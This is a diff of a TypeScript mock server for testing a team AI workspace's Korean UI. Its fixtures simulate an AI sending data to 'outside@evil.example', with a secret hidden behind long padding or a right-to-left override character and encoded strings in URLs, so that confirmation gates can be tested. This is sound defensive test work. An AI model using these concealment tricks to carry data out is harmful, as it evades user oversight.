@@ -61,6 +61,7 @@
 import { z } from 'zod'
 import type { DriveShare as MockDriveShare, DriveShareFolder as MockDriveFolder } from '@mycel/shared/api'
 import type { LocalSpeechTool } from '@mycel/shared/api'
+import type { FileListStatus } from '@mycel/shared/api'
 import type { SkillMoveTarget } from '@mycel/shared/api'
 import type { IntegrationAuth, IntegrationKind, OAuthClientInput, OAuthClientView } from '@mycel/shared/api'
 import type { EndedConnection, HandoverConnection, HandoverRecovery, HandoverState, InboxNotification } from '@mycel/shared/api'
@@ -80,13 +81,21 @@ import { serveWeb } from '../../../server/src/routes/web-static'
 import { TEXT as TEAM_ICON_TEXT } from '../../../server/src/admin/team-icon'
 import { msg as serverMsg } from '../../../server/src/auth/messages'
 import { folderKeep, isParkedRow, isTeamDefaultFolder } from '../../../server/src/admin/folder-keep'
-import { checkTeamIcon, CHAT_FILES_FOLDER, TEAM_ICON_MAX_BYTES, WEB_ALLOW_ALL_WARNING_VERSION, type TeamIconFile } from '@mycel/shared'
+import { checkTeamIcon, CHAT_FILES_FOLDER, stepLabel, stepText, TEAM_ICON_MAX_BYTES, WEB_ALLOW_ALL_WARNING_VERSION, type TeamIconFile } from '@mycel/shared'
 import { MSG as FILE_MSG } from '../../../server/src/team-files/errors'
 import { TEXT as CHAT_TEXT } from '../../../server/src/chat/i18n'
+import { say as connectionSay } from '../../../server/src/integrations/connections/text'
+// the address card's words as server/src/tools/url-gate.ts TEXT says them (that module is not imported: it would pull the
+// server's file and connection code into the browser TypeScript program)
+const URL_TEXT = {
+  unseen: { ko: 'AI가 이 대화에 없던 주소를 열려고 해요. 주소에 내 정보가 들어 있지 않은지 확인해 주세요.\n\n{url}' },
+  site: { ko: '사이트를 허용하면 이 대화에서는 {site}의 다른 주소도 묻지 않고 열어요. 알아보기 어려운 긴 글자나 긴 내용이 붙은 주소는 계속 물어봐요.' },
+  opaque: { ko: '주소에 알아보기 어려운 긴 글자가 있어요(강조 표시). 내 정보가 숨어 있을 수 있으니 확인해 주세요.' },
+}
 import { Sealer } from '../../../server/src/credentials/seal'
 import type { Credential, CredentialKind, CredentialLogin, MessageSourceFile, SealedSecret } from '@mycel/shared/api'
 import type { Integration, IntegrationAccess, IntegrationFlow, IntegrationInput, IntegrationPatch, IntegrationRequest, IntegrationTemplate, IntegrationTool } from '@mycel/shared/api'
-import { normalizeWebsite, SkillsOverview, type AccessFolderKind, type AccessTreeResponse, type FolderAccessResponse, type FolderEditPreview, type PersonAccessResponse } from '@mycel/shared/api'
+import { normalizeWebsite, OWNER_ONLY_SETTINGS, SkillsOverview, type AccessFolderKind, type AccessTreeResponse, type FolderAccessResponse, type FolderEditPreview, type PersonAccessResponse } from '@mycel/shared/api'
 import { RuleSet, type Access } from '../../../server/src/policy/access'
 import { byPerson, folderInput, MAX_VIA, navigation, pageByPath, pageByPerson, ruleFolderOf, segsOf, shownPath, shownSegs, summarize, withoutOwnFolder } from '../../../server/src/admin/access-rows'
 import { ruledAnswer, treeAnswer, type TreeMark, type TreeSource } from '../../../server/src/admin/access-tree'
@@ -473,8 +482,12 @@ export class MockServer {
   fileRank: { ai: 'done' | 'none' | 'failed' | 'timeout'; delayMs: number } = { ai: 'done', delayMs: 0 }
   fileRankCalls: { entries: unknown[] }[] = []
 
+  /** Admin › Team settings › File list (server/src/file-list/): POST /__test/file-list {status fields} sets what the
+   * status says (a problem, the sign-in, counts); Run now runs at once and is done by the next status read */
+  fileList: FileListStatus = mockFileList()
   reset(o: { setup?: boolean; teamLocale?: Locale; usersFollowTeam?: boolean; mustChange?: string; withAdmin?: boolean } = {}) {
     this.generation++
+    this.fileList = mockFileList()
     this.presence = new Map()
     this.presenceSent = []
     this.statuses = new Map()
@@ -810,7 +823,7 @@ export class MockServer {
     const active = this.users.filter((u) => u.status === 'active')
     const segs = segsOf(p)
     const out = editPreview(
-      { rules: this.explainRules(), people: active.map((u) => this.explainPrincipal(u)), groupName: (id) => this.groups.find((g) => g.id === id)?.name ?? null, personName: (id) => this.users.find((u) => u.id === id)?.name ?? null },
+      { rules: this.explainRules(), people: active.map((u) => this.explainPrincipal(u)), uncounted: this.users.filter((u) => u.status !== 'active').map((u) => this.explainPrincipal(u)), groupName: (id) => this.groups.find((g) => g.id === id)?.name ?? null, personName: (id) => this.users.find((u) => u.id === id)?.name ?? null },
       p, body.rules, { team: isTeamDefaultFolder(p, false) ? (p === 'shared' ? 'shared' : 'skills') : null },
     )
     return { path: p, exists: p === '' || this.files.get(p)?.type === 'folder', connected: segs.length >= 2 && segs[0] === 'connected' && this.files.get(`connected/${segs[1]}`)?.type === 'folder', ...out }
@@ -1278,6 +1291,19 @@ export class MockServer {
       assistant.steps = [...assistant.steps, s2]
       pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: s2 } })
     }
+    if (/plainsteps/i.test(prompt)) {
+      const put = (x: Step) => { assistant.steps = [...assistant.steps.filter((y) => y.id !== x.id), x]; pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: x } }) }
+      const done = { status: 'ok' as const, endedAt: now() }
+      put(step({ id: 'p1', kind: 'tool', tool: 'engine', label: stepText('engineOffDefault', 'ko', { from: 'Claude Code', to: 'Codex' }), ...done }))
+      put(step({ id: 'p2', kind: 'tool', tool: 'refusal', label: stepText('refusedRetry', 'ko', { model: 'claude-opus-4' }), ...done }))
+      put(step({ id: 'p3', kind: 'tool', tool: 'knowledge_explore', label: stepLabel('knowledge_explore', { query: '견적' }, 'ko', new Set()), ...done }))
+      // a connection's steps as integrations/connections/tools.ts writes them: the tool's title, what the method does
+      put(step({ id: 'p4', kind: 'tool', tool: 'my_tasks__create_task', label: 'Tasks · 할 일 만들기', ...done }))
+      put(step({ id: 'p5', kind: 'tool', tool: 'api_request', label: `Tasks · ${connectionSay('methodPOST', 'ko')}`, ...done }))
+      put(step({ id: 'p6', kind: 'tool', tool: 'TodoWrite', label: stepLabel('TodoWrite', {}, 'ko', new Set()), ...done }))
+      put(step({ id: 'p7', kind: 'tool', tool: 'artifact', label: stepLabel('artifact', { title: '매출 차트' }, 'ko', new Set()), ...done }))
+      put(step({ id: 'p8', kind: 'tool', tool: 'schedule_delete', label: stepLabel('schedule_delete', { id: '0193a1b2-c3d4-7e5f-8a9b-0c1d2e3f4a5b' }, 'ko', new Set()), ...done }))
+    }
     if (/wrong-guess/i.test(prompt)) {
       // the AI guesses a file name that does not exist, then finds the right file: a failed step it got past
       // (docs/DECISIONS.md "A failed step the AI got past is not red")
@@ -1328,15 +1354,15 @@ export class MockServer {
         ? { kind: 'browser_site', requestId, url: 'http://10.0.0.5/intranet/', host: '10.0.0.5', reason: '사내 문서 페이지를 열려고 해요.' }
         : /siteask/i.test(prompt)
         ? { kind: 'ask_user', origin: 'server', requestId, allowText: false, multiple: false,
-          question: `AI가 이 대화에 나온 적 없는 주소를 열려고 해요. 주소에 내용을 실어 밖으로 보낼 수도 있으니 주소 전체를 확인해 주세요.\n\n${siteUrl}\n\n사이트를 허용하면 이 대화에서만 example.co.kr의 다른 주소도 묻지 않고 열어요. 알아보기 어려운 긴 문자열이나 긴 내용이 붙은 주소는 계속 물어요.`,
+          question: `${URL_TEXT.unseen.ko.replace('{url}', siteUrl)}\n\n${URL_TEXT.site.ko.replace('{site}', 'example.co.kr')}`,
           options: [{ label: '열기', value: 'allow' }, { label: '이 대화에서 이 사이트 허용 (example.co.kr)', value: 'site' }, { label: '열지 않기', value: 'deny' }] }
         : /markask/i.test(prompt)
         ? { kind: 'ask_user', origin: 'server', requestId, allowText: false, multiple: false,
-          question: `AI가 이 대화에 나온 적 없는 주소를 열려고 해요. 주소에 내용을 실어 밖으로 보낼 수도 있으니 주소 전체를 확인해 주세요.\n\n${markUrl}\n\n주소에 알아보기 어려운 긴 문자열이 있어요(강조 표시). 내용을 실어 보낼 수 있으니 무엇인지 확인해 주세요.`,
+          question: `${URL_TEXT.unseen.ko.replace('{url}', markUrl)}\n\n${URL_TEXT.opaque.ko}`,
           options: [{ label: '열기', value: 'allow' }, { label: '열지 않기', value: 'deny' }],
           details: [{ label: '주소', text: markUrl, marks: ['c2fsyxj5ltk4nzy1ndmy'] }] }
         : /safety/i.test(prompt)
-        ? { kind: 'ask_user', origin: 'server', requestId, question: 'AI가 이 대화에 나온 적 없는 주소를 열려고 해요.\n\nhttps://example.com/?d=1', options: [{ label: '열기', value: 'allow' }, { label: '열지 않기', value: 'deny' }], allowText: false }
+        ? { kind: 'ask_user', origin: 'server', requestId, question: URL_TEXT.unseen.ko.replace('{url}', 'https://example.com/?d=1'), options: [{ label: '열기', value: 'allow' }, { label: '열지 않기', value: 'deny' }], allowText: false }
         : /multi/i.test(prompt)
           ? { kind: 'ask_user', requestId, question: '보고서에 어느 분기를 넣을까요?', options: [{ label: '3분기', value: 'q3' }, { label: '4분기', value: 'q4' }], multiple: true, allowText: true }
           : { kind: 'ask_user', requestId, question: '어느 분기를 볼까요?', options: [{ label: '3분기', value: 'q3' }, { label: '4분기', value: 'q4' }], allowText: true }
@@ -1415,14 +1441,22 @@ export class MockServer {
       prompt += ` answered:${JSON.stringify(answer)}`
     }
     if (/sendcard/i.test(prompt)) {
-      // like server/src/integrations/connections/tools.ts gate: everything a connected service is sent, where it goes first
+      // like server/src/integrations/connections/tools.ts gate: the tool by its title, every value as a labelled line with
+      // where it goes first, the exact JSON one click away ("sendcard raw": a call the lines cannot show, the JSON open)
       const requestId = 'w1'
-      const payload = JSON.stringify({ title: 'Weekly notes c2fsyxj5ltk4nzy1ndmy ' + 'x'.repeat(2000) + ' SECRET-AT-THE-END', to: 'outside@evil.example' }, null, 2)
+      const args = /sendcard raw/i.test(prompt)
+        ? { to: 'outside@evil.example', title: 'Weekly notes c2fsyxj5ltk4nzy1ndmy \u202e' + 'x'.repeat(2000) + ' SECRET-AT-THE-END' }
+        : { title: 'Weekly notes c2fsyxj5ltk4nzy1ndmy ' + 'x'.repeat(2000) + ' SECRET-AT-THE-END', to: 'outside@evil.example', due_date: '2026-11-14' }
+      const payload = JSON.stringify(args, null, 2)
+      // what integrations/connections/card-lines.ts makes of them: the lines (none for the raw one: an invisible
+      // character), the title or the id in words
+      const raw = /sendcard raw/i.test(prompt)
+      const lines = raw ? null : [{ name: '받는 사람', value: 'outside@evil.example' }, { name: '제목', value: (args as { title: string }).title }, { name: '마감일', value: '2026-11-14' }]
       const request: TurnRequest = {
         kind: 'ask_user', origin: 'server', requestId, allowText: false, multiple: false,
-        question: 'AI가 Tasks에서 이 작업을 하려고 해요: create_task\n\n보낼 내용 전체와 받는 곳을 아래에서 확인해 주세요.\n\n보낼까요?',
+        question: `${connectionSay('confirm', 'ko', { name: 'Tasks', what: raw ? 'Create task' : '할 일 만들기' })}\n\n${connectionSay('checkBelow', 'ko')}\n\n${connectionSay('ask', 'ko')}`,
         options: [{ label: '보내기', value: 'allow' }, { label: '보내지 않기', value: 'deny' }],
-        details: [{ label: '보낼 내용', text: payload, fields: [{ name: 'to', value: 'outside@evil.example' }], marks: ['c2fsyxj5ltk4nzy1ndmy'] }],
+        details: [{ label: connectionSay('sendsLabel', 'ko'), text: payload, fields: lines ?? [{ name: '받는 사람', value: 'outside@evil.example' }], marks: ['c2fsyxj5ltk4nzy1ndmy'], ...(lines ? { exact: true as const } : {}) }],
       }
       this.openAsks.set(turnId, { turnId, chatId, messageId: assistant.id, request })
       pub({ type: 'turn.request', data: { turnId, chatId, messageId: assistant.id, request } })
@@ -1763,6 +1797,23 @@ export class MockServer {
 
   // ---------------- handlers ----------------
   handlers: Partial<Record<ApiName, Handler>> = {
+    // like server/src/routes/file-list.ts: off clears the counts (the stored lines are deleted); Run now is refused while
+    // off; a run "ends" at the next status read
+    fileListStatus: () => {
+      const s = this.fileList
+      if (s.running) this.fileList = { ...s, running: false, listed: s.listed + s.waiting, waiting: 0, lastRun: { ...s.lastRun!, endedAt: new Date().toISOString(), read: s.waiting, stoppedBy: 'done' } }
+      return s
+    },
+    updateFileList: (c) => {
+      if (c.body.enabled && this.fileList.forcedOff) throw new Fail('conflict', 409, 'forced off', undefined, { reason: 'forced_off' })
+      this.fileList = c.body.enabled ? { ...this.fileList, enabled: true, nextRunAt: new Date(Date.now() + 9 * 3600_000).toISOString() } : { ...this.fileList, enabled: false, running: false, listed: 0, waiting: 0, nextRunAt: null, problem: null }
+      return this.fileList
+    },
+    runFileList: () => {
+      if (!this.fileList.enabled || this.fileList.forcedOff) throw new Fail('conflict', 409, 'off', undefined, { reason: 'off' })
+      this.fileList = { ...this.fileList, running: true, lastRun: { startedAt: new Date().toISOString(), endedAt: null, trigger: 'now', read: 0, stoppedBy: null } }
+      return this.fileList
+    },
     frequentQuestions: () => ({ items: [], days: 30, sampled: false }),
     // like server/src/skills/popular.ts: only skills the caller can read now, with their title
     popularSkills: (c) => ({ items: this.popular.flatMap((p) => { const s = this.skillsFor(c.user).find((x) => x.path === p.path && !x.personal); return s ? [{ ...s, uses: p.uses, users: p.users }] : [] }), days: 30 }),
@@ -3182,6 +3233,10 @@ export class MockServer {
       if (isTeamDefaultFolder(c.body.path, false) && !c.body.rules?.length) fail('validation', 400, serverMsg('teamFolderKeepsRules', c.user.locale), { 'body.rules': 'shared/ and skills/ keep at least one rule' })
       // like the server: rules made there meanwhile (the hash the editor started from is not the rules' now)
       if (c.body.expectedHash !== undefined && c.body.expectedHash !== rulesHash(this.folders.find((f) => f.path === c.body.path)?.rules ?? [])) throw new Fail('conflict', 409, serverMsg('rulesChanged', c.user.locale), undefined, { reason: 'rules_changed' })
+      // like the server: a row with rules made meanwhile is said as such (a screen that read the folder list before it)
+      const had = this.folders.find((x) => x.path === c.body.path && !isParkedRow(x.path))
+      if (had?.rules.length) throw new Fail('conflict', 409, serverMsg('folderExists', c.user.locale), undefined, { reason: 'folder_exists' })
+      if (had) this.folders = this.folders.filter((x) => x !== had)
       // like the server (create defaults to true): the folder and those above it are made
       if (c.body.create !== false) for (let i = 1, parts = String(c.body.path).split('/'); c.body.path && i <= parts.length; i++) { const d = parts.slice(0, i).join('/'); if (!this.files.has(d)) this.files.set(d, { type: 'folder', mtime: now() }) }
       const f: Folder = { id: uuidv7(), path: c.body.path, exists: c.body.path === '' || this.files.get(c.body.path)?.type === 'folder', createdAt: now(), rules: [] }
@@ -3258,6 +3313,8 @@ export class MockServer {
       return { ...this.speechKey, hosted: null }
     },
     updateSettings: (c) => {
+      // like server/src/routes/admin.ts: the team name, retention periods and update channel are the owner's
+      if (c.user.role !== 'owner' && (['teamName', ...OWNER_ONLY_SETTINGS] as const).some((k) => c.body[k] !== undefined && c.body[k] !== this.settings[k])) fail('forbidden', 403, 'Only the team owner can change this.')
       const before = this.settings.defaultLocale
       const policyBefore = this.settings.browserAllowAll
       const webBefore = this.webTeam()
@@ -4418,6 +4475,7 @@ export class MockServer {
     const body = (await req.json().catch(() => ({}))) as Json
     if (p === '/__test/reset') this.reset({ setup: !!body.setup, teamLocale: Locale.safeParse(body.teamLocale).data, usersFollowTeam: !!body.usersFollowTeam, mustChange: typeof body.mustChange === 'string' ? body.mustChange : undefined, withAdmin: !!body.withAdmin })
     else if (p === '/__test/drop-ws') for (const ws of this.sockets) ws.close(WsClose.serviceRestart, 'restart')
+    else if (p === '/__test/file-list') this.fileList = { ...this.fileList, ...(body as Partial<FileListStatus>) }
     else if (p === '/__test/handover') {
       if (typeof body.flag === 'boolean') this.handover.flag = body.flag
       if (body.recovery !== undefined) this.handover.recovery = body.recovery as HandoverRecovery | null
@@ -4757,7 +4815,7 @@ export class MockServer {
       const { shareChats, ...rest } = c.body as { shareChats?: boolean }
       if (shareChats !== undefined) {
         if (p.folderPath.startsWith('users/')) fail('conflict', 409, '개인 프로젝트의 채팅은 공유할 수 없어요.', { 'body.shareChats': 'project_personal' }, { reason: 'project_personal' })
-        if (shareChats && this.allConfidential) fail('conflict', 409, '안전 작업 모드에서는 채팅을 공유할 수 없어요.', { 'body.shareChats': 'safe_ops' }, { reason: 'safe_ops' })
+        if (shareChats && this.allConfidential) fail('conflict', 409, CHAT_TEXT.sharedProjectSafeOps.ko, { 'body.shareChats': 'safe_ops' }, { reason: 'safe_ops' })
         if (p.inTrash) fail('conflict', 409, '폴더가 휴지통에 있는 프로젝트예요.', { 'body.shareChats': 'project_in_trash' }, { reason: 'project_in_trash' })
         if (shareChats) this.sharedProjects.add(p.id)
         else this.sharedProjects.delete(p.id)
@@ -4923,7 +4981,7 @@ export class MockServer {
     }
     const mayContinue = (u: User, chatId: string) => {
       view(chatOf(chatId), u)
-      if (this.allConfidential) fail('conflict', 409, '안전 작업 모드라서 공유 채팅을 이어갈 수 없어요. 내 채팅에서 물어봐 주세요.', undefined, { reason: 'safe_ops' })
+      if (this.allConfidential) fail('conflict', 409, CHAT_TEXT.sharedChatSafeOps.ko, undefined, { reason: 'safe_ops' })
     }
     const teamOnly = (ids: string[]) => {
       const atts = ids.map((id) => this.attachments.get(id)).filter((a): a is NonNullable<typeof a> => !!a)
@@ -4995,7 +5053,7 @@ export class MockServer {
       const chat = chatOf(c.params.id!)
       if (this.sharedChats.has(chat.id)) { view(chat, c.user); no('already_shared', '이미 프로젝트 사람들과 공유한 채팅이에요.') }
       if (othersPrivate(chat.id, c.user) || chat.deletedAt) fail('not_found', 404)
-      if (this.allConfidential || chat.confidential) no('safe_ops', '안전 작업 모드이거나 기밀 대화라 공유할 수 없어요.')
+      if (this.allConfidential || chat.confidential) no('safe_ops', CHAT_TEXT.chatShareSafeOps.ko)
       const p = chat.projectId ? this.projects.find((x) => x.id === chat.projectId) : undefined
       if (!p || this.access(p.folderPath, c.user) === 'none') return no('project_not_sharing', '이 채팅은 채팅을 공유하는 팀 프로젝트에 있지 않아요. 그런 프로젝트로 옮긴 뒤에 공유해 주세요.')
       if (p.folderPath.startsWith('users/')) no('project_personal', '개인 프로젝트의 채팅은 공유할 수 없어요.')
@@ -5272,3 +5330,15 @@ function officeFixtures(): [string, Uint8Array][] {
   return (office = out)
 }
 
+/** The file list's status on a new mock team: on, 1,240 files listed, 18 waiting, last run last night, the team AI
+ * account "Team Claude" signed in by Dana. */
+function mockFileList(): FileListStatus {
+  const night = new Date(); night.setHours(3, 12, 0, 0); if (night.getTime() > Date.now()) night.setDate(night.getDate() - 1)
+  const next = new Date(night.getTime() + 24 * 3600_000 - 70 * 60_000)
+  return {
+    enabled: true, forcedOff: false, running: false, listed: 1240, waiting: 18,
+    lastRun: { startedAt: night.toISOString(), endedAt: new Date(night.getTime() + 9 * 60_000).toISOString(), trigger: 'nightly', read: 96, stoppedBy: 'done' },
+    nextRunAt: next.toISOString(), problem: null,
+    signIn: { engine: 'claude-code', model: 'haiku', kind: 'team', label: 'Team Claude', by: 'Dana' },
+  }
+}
